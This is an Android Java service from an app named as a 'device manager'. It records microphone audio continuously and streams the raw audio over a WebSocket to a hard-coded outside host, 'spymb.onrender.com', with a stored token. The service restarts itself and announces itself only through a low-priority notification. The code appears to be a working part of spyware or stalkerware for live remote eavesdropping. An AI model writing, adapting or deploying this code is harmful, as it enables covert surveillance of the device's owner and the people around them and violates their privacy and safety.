package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

import java.util.concurrent.TimeUnit;

public class StreamingService extends Service {
	private static final String TAG = "StreamingSvc";
	private static final String CHANNEL_ID = "stream_channel";
	private static final int NOTIF_ID = 4001;
	
	private AudioRecord recorder;
	private Thread captureThread;
	private volatile boolean running = false;
	private WebSocket ws;
	
	@Override
	public void onCreate() {
		super.onCreate();
		createNotificationChannel();
	}
	
	private void createNotificationChannel(){
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Live Stream", NotificationManager.IMPORTANCE_LOW);
			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
			if (nm != null) nm.createNotificationChannel(ch);
		}
	}
	
	private Notification buildNotification(){
		return new NotificationCompat.Builder(this, CHANNEL_ID)
		.setContentTitle("Transmissão ativa")
		.setContentText("A transmitir áudio — toque para abrir a app.")
		.setSmallIcon(android.R.drawable.ic_btn_speak_now)
		.setPriority(NotificationCompat.PRIORITY_LOW)
		.setOngoing(true)
		.build();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId){
		startForeground(NOTIF_ID, buildNotification());
		startStreaming();
		return START_STICKY;
	}
	
	private void startStreaming(){
		if (running) return;
		running = true;
		
		final int sampleRate = 16000;
		final int channelConfig = AudioFormat.CHANNEL_IN_MONO;
		final int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
		int minBuf = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
		final int bufferSize = Math.max(minBuf, 4096);
		
		recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize);
		
		OkHttpClient client = new OkHttpClient.Builder()
		.connectTimeout(30, TimeUnit.SECONDS)
		.writeTimeout(0, TimeUnit.MILLISECONDS) // streaming: disable write timeout
		.readTimeout(0, TimeUnit.MILLISECONDS)
		.build();
		
		String token = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("auth_token", "");
		// Replace YOUR_DOMAIN with your server host (wss, TLS required in production)
		String url = "wss://spymb.onrender.com/ws/stream?token=" + token;
		
		Request req = new Request.Builder().url(url).build();
		ws = client.newWebSocket(req, new WebSocketListener() {
			@Override public void onOpen(WebSocket webSocket, okhttp3.Response response) {
				Log.i(TAG, "ws open");
			}
			@Override public void onMessage(WebSocket webSocket, String text) {
				Log.i(TAG, "ws msg: " + text);
			}
			@Override public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
				Log.e(TAG, "ws fail", t);
				stopSelf();
			}
			@Override public void onClosed(WebSocket webSocket, int code, String reason) {
				Log.i(TAG, "ws closed: " + code + " " + reason);
			}
		});
		
		recorder.startRecording();
		
		captureThread = new Thread(() -> {
			byte[] buffer = new byte[2048];
			while (running && recorder.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
				int r = recorder.read(buffer, 0, buffer.length);
				if (r > 0) {
					ws.send(ByteString.of(buffer, 0, r));
					} else {
					Log.w(TAG, "audio read <= 0: " + r);
				}
			}
			try { if (recorder != null) recorder.stop(); } catch (Exception ignored) {}
			try { if (recorder != null) recorder.release(); } catch (Exception ignored) {}
			recorder = null;
			if (ws != null) { ws.close(1000, "normal"); ws = null; }
			Log.i(TAG, "capture thread ended");
			stopSelf();
		}, "AudioCaptureThread");
		captureThread.start();
	}
	
	private void stopStreaming(){
		running = false;
		// captureThread will exit and cleanup
	}
	
	@Override
	public void onDestroy(){
		stopStreaming();
		super.onDestroy();
	}
	
	@Override
	public IBinder onBind(Intent intent){ return null; }
}